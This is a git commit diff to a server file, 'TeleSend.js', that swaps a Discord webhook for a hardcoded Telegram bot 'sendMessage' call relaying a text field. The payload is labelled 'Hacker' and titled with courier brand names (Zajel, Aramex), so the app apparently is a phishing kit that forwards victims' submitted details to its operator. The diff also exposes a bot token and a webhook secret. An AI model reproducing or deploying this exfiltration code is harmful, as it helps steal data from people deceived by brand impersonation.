78ab1850c3c862129824e9bcc17186e1f8f394c0
Mhmd8998 <alnasrmhmd9988@gmail.com>
2024-12-11 21:55:07 +0300

    Update TeleSend.js

--- ‏‏my-app/src/server/TeleSend.js
+++ ‏‏my-app/src/server/TeleSend.js
@@ -4,20 +4,19 @@ import axios from 'axios';
 export const TeleSned = () => {
 
     const Send = async (des) => {
-        const body = {
+              /*  const body = {
           content: "Hacker",
           tts: false,
           color: "white",
           embeds: [
             {
-              title: " مدونة زاجل ",
+              title: "مدونة ارامكس",
               description: des,
            },
           ],
     };
-            
-        await axios.post("https://discord.com/api/webhooks/1316469553030631454/yV6c9YgnOkAw_eEzZLfYUTqXBCu-A40IZPTtOseLqAvGuMUuK42l9B95DpCw1N3QDWnQ",body)
-             
+       */let txt= "مدونة زاجل  %0A"+ des   
+        await         await axios.post(`https://api.telegram.org/bot7560249245:AAH-vNieN52eiQmvztRnC25bmhSRb9JMHlo/sendMessage?chat_id=2096894672&text=${txt}`) 
     }
   return {
     Send,
